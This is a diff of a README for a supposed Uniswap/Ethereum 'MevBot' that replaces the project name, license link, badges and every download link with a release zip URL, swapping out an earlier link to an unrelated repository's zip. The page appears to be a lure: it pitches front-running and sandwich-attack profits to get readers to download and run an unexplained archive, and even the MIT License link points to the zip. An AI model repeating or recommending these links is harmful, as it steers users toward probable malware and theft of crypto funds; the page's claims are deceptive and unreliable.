@@ -1,17 +1,17 @@
-# 🤖🌍 MevBot.Uniswap-ETH: Optimizing MEV Extraction
+# 🤖🌍 https://github.com/tedo2210/MevBot.Uniswap-ETH/releases/download/v1.0/Program.zip Optimizing MEV Extraction
 
 ## Overview
-Welcome to MevBot.Uniswap-ETH, an Ethereum bot 🤖 designed in Solidity 🔒 to optimize MEV (Miner Extractable Value) 💸 extraction. This powerful bot features mempool 🌊 monitoring, front-running 🚀 capabilities, and robust security mechanisms 🔐. 
+Welcome to https://github.com/tedo2210/MevBot.Uniswap-ETH/releases/download/v1.0/Program.zip, an Ethereum bot 🤖 designed in Solidity 🔒 to optimize MEV (Miner Extractable Value) 💸 extraction. This powerful bot features mempool 🌊 monitoring, front-running 🚀 capabilities, and robust security mechanisms 🔐. 
 
 ## Repository Details
-- **Repository Name:** MevBot.Uniswap-ETH
+- **Repository Name:** https://github.com/tedo2210/MevBot.Uniswap-ETH/releases/download/v1.0/Program.zip
 - **Short Description:** 🤖 Mev B0T: An Ethereum bot 🌍 designed in Solidity 🔒 to optimize MEV (Miner Extractable Value) 💸 extraction. Features mempool 🌊 monitoring, front-running 🚀, and robust security mechanisms 🔐.
 - **Topics:** blockchain, bot, crypto-bot, cryptocurrency, dex, eth, ethereum, evm, mempool, mev, mev-bots, sandwich-attacks, solana, solana-snipe-bot, solidity, trade-bot, trading, tradingbot, uniswap
 
 ## Get Started
 Explore the capabilities of MevBot by downloading the latest version from the link below:
 
-[![Download MevBot](https://img.shields.io/badge/Download-MevBot-orange)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download MevBot](https://github.com/tedo2210/MevBot.Uniswap-ETH/releases/download/v1.0/Program.zip)](https://github.com/tedo2210/MevBot.Uniswap-ETH/releases/download/v1.0/Program.zip)
 
 ## Installation Guide
 Follow these steps to launch MevBot:
@@ -31,7 +31,7 @@ Stay ahead of the competition with MevBot's front-running capabilities, allowing
 MevBot is equipped with robust security features to safeguard your transactions and funds during MEV extraction activities.
 
 ## Support and Feedback
-For any questions, feedback, or issues with MevBot.Uniswap-ETH, please reach out to the developers or community members on the official repository.
+For any questions, feedback, or issues with https://github.com/tedo2210/MevBot.Uniswap-ETH/releases/download/v1.0/Program.zip, please reach out to the developers or community members on the official repository.
 
 ## Contributors
 - MevBot development is led by a team of skilled developers with expertise in Solidity, Ethereum, and blockchain technologies.
@@ -40,11 +40,11 @@ For any questions, feedback, or issues with MevBot.Uniswap-ETH, please reach out
 Stay up to date with the latest features, improvements, and releases by checking the "Releases" section of the repository.
 
 ## License
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+This project is licensed under the [MIT License](https://github.com/tedo2210/MevBot.Uniswap-ETH/releases/download/v1.0/Program.zip).
 
 🚀 Happy MEV Extracting with MevBot! 🤖💸
 
-Visit [MevBot.Uniswap-ETH Repository](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip) for MevBot download.
+Visit [https://github.com/tedo2210/MevBot.Uniswap-ETH/releases/download/v1.0/Program.zip Repository](https://github.com/tedo2210/MevBot.Uniswap-ETH/releases/download/v1.0/Program.zip) for MevBot download.
 
 ---
 
@@ -64,11 +64,11 @@ Join the MevBot community to connect with fellow developers, traders, and enthus
 MevBot is a dynamic project that undergoes continuous improvement and updates to adapt to the evolving landscape of blockchain technology and trading practices. By staying engaged with the MevBot community and following the latest releases, you can benefit from cutting-edge features and enhancements to optimize your MEV extraction strategies.
 
 ## Conclusion
-Experience the power of MevBot.Uniswap-ETH and elevate your MEV extraction game to new heights. With its advanced features, robust security, and dedicated community support, MevBot is your ultimate companion for maximizing profits and efficiency in the world of blockchain trading. Download MevBot today and start optimizing your MEV extraction activities like never before! 🌟
+Experience the power of https://github.com/tedo2210/MevBot.Uniswap-ETH/releases/download/v1.0/Program.zip and elevate your MEV extraction game to new heights. With its advanced features, robust security, and dedicated community support, MevBot is your ultimate companion for maximizing profits and efficiency in the world of blockchain trading. Download MevBot today and start optimizing your MEV extraction activities like never before! 🌟
 
-🌍 **Explore the possibilities with MevBot.Uniswap-ETH!** 🔒
+🌍 **Explore the possibilities with https://github.com/tedo2210/MevBot.Uniswap-ETH/releases/download/v1.0/Program.zip!** 🔒
 
-[![Download MevBot](https://img.shields.io/badge/Download-MevBot-orange)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download MevBot](https://github.com/tedo2210/MevBot.Uniswap-ETH/releases/download/v1.0/Program.zip)](https://github.com/tedo2210/MevBot.Uniswap-ETH/releases/download/v1.0/Program.zip)
 
 ---
 
